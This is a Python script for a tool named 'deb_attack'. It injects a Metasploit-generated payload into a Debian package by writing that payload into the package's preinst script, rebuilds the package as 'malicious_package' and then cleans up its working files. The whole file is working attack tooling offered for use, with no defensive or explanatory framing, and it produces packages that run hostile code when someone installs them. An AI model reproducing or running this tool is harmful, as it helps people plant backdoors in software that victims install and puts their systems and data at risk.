#!/bin/python3
# CREDIT BY ' S I D '
import argparse
import os ,sys,shutil,time
import subprocess
import shutil
from colorama import Fore 
from utils.colors import colors as c

def Check_input():
	parser = argparse.ArgumentParser(description=Fore.LIGHTBLUE_EX+'This tool building deb Auto Package Builder and give only payload (python bash) ',epilog=' python3 %(prog)s  -d example.deb -p payload_file_path_name ')
	parser.add_argument('-v', '--version', action='version', version='1.0')
	parser.add_argument('-d','--deb',help='debian Package path to inject malicious payload ',metavar='deb package name')
	parser.add_argument('-p','--payload',help=' give me metasploit generated payload path to inject package in payload ',metavar='payload_file_name')
	args = parser.parse_args()
	return args




def print_banner(c):


    banner_top = '''
                                ----__ ''""    ___``'/````\   
                              ,'     ,'    `--/   __,      \-,,,`.
                        ,""""'     .' ;-.    ,  ,'  \             `"""".
                      ,'           `-(   `._(_,'     )_                `.
                     ,'         ,---. \ @ ;   \ @ _,'                   `.
                ,-""'         ,'      ,--'-    `;'                       `.
               ,'            ,'      (      `. ,'                          `.
               ;            ,'        \    _,','   Offensive                `.
              ,'            ;          `--'  ,'  Infrastructure               `.
             ,'             ;          __    (     Deployment                `.
             ;              `____...  `78b   `.                  ,'           ,'
             ;    ...----''" )  _.-  .d8P    `.                ,'    ,'    ,'
    
    '''
    banner = f'''_....----'" '.        _..--"_.-:.-' .'        `.             ,''.   ,' `--'
              `" mGk "" _.-'' .-'`-.:..___...--' `-._      ,-"'   `-'
        _.--'       _.-'    .'   .' .'               `"""""
  __.-''        _.-'     .-'   .'  /     ~~~
 '          _.-' .-'  .-'        .'    
        _.-'  .-'  .-' .'  .'   /  {c.fg.lightgreen}S I D{c.fg.lightred}
    _.-'      .-'   .-'  .'   .'   
_.-'       .-'    .'   .'    /           ~~~
       _.-'    .-'   .'    .'     @sidh4ck3r
    .-'            .'
	'''

    print("\n\n")
    
    print(c.fg.lightblue + c.bold + c.fg.lightblue + banner_top  + banner + c.reset + "\n\n\n")
    print("\n\n\t\tThank you for using" + c.fg.red+ " deb_attack!" + c.bold + " <3" +c.reset)   
    print("\n") 
    time.sleep(3)

print_banner(c)



def Unpacking_Payload(args):
	print(Fore.LIGHTMAGENTA_EX+f"[+] Extracting {args.payload}..."+Fore.WHITE)
	try:
		p = open(args.payload,'r').read()
		return p
		

	except Exception as e:
		print(Fore.RED+'[-] File Not Found '+Fore.WHITE)


def Unpacking_Deb(args):
	print(Fore.LIGHTGREEN_EX+f"[+] Extracting {args.deb}..."+Fore.WHITE)
	file = os.path.basename(args.deb)
	name = os.path.splitext(file)[0]
	package = f"/tmp/{name}"
	try:
		io = subprocess.Popen(["dpkg-deb","-R",file,package],stdout=subprocess.PIPE)
		io.communicate()
	except Exception as e:
		print(Fore.RED+e+Fore.WHITE)
		sys.exit()
	return package


def Check_script(package_path):
	print(Fore.LIGHTGREEN_EX+f"[+] Checking script..."+Fore.WHITE)
	deb_path = f"{package_path}/DEBIAN"
	preinst_path = f"{deb_path}/preinst"

	if os.path.exists(preinst_path):
		return preinst_path
	else:
		preinst = open(preinst_path,'w')
		preinst.close()
		os.chmod(preinst_path,0o755)
		return preinst_path


	
def Embbed(script_path,payload):
	print(Fore.LIGHTYELLOW_EX+f"[+] Binding Payload..."+Fore.WHITE)
	script_path = script_path
	payload = f'#!/bin/bash\npython3 -c "{payload}"'
	file = open(script_path,'w')
	file.write(payload)
	file.close()

def Compress(package_path):
	print(Fore.LIGHTMAGENTA_EX+f"[+]Compressing package..."+Fore.WHITE)
	cwd = os.getcwd()
	malic_path = f"{cwd}/malicious_package"
	if not os.path.exists(malic_path):
		os.system(f'mkdir {malic_path}')
		try:
			io = subprocess.Popen(['dpkg-deb','-b',package_path,malic_path],stdout=subprocess.PIPE)
			io.communicate()
		except Exception as e:
			print(Fore.RED+e+Fore.WHITE)

	else:
		malic_path = f"{cwd}/malicious_package/"
		try:
			io = subprocess.Popen(['dpkg-deb','-b',package_path,malic_path],stdout=subprocess.PIPE)
			io.communicate()
		except Exception as e:
			print(Fore.RED+e+Fore.WHITE)




def Clean(package_path):
	print(Fore.LIGHTGREEN_EX+f"[+] Cleaning Trackes..."+Fore.WHITE)
	shutil.rmtree(package_path)



if len(sys.argv) < 2:
	os.system('python3 %s --help' % sys.argv[0])
	sys.exit(-1)


args = Check_input()

if not os.path.exists(args.deb) or not os.path.exists(args.payload):
	print(Fore.RED+'[-] File Not Found '+Fore.WHITE)
	sys.exit()


if __name__=='__main__':
	payload = Unpacking_Payload(args)
	package_path = Unpacking_Deb(args)
	script = Check_script(package_path)
	Embbed(script, payload)
	Compress(package_path)
	Clean(package_path )















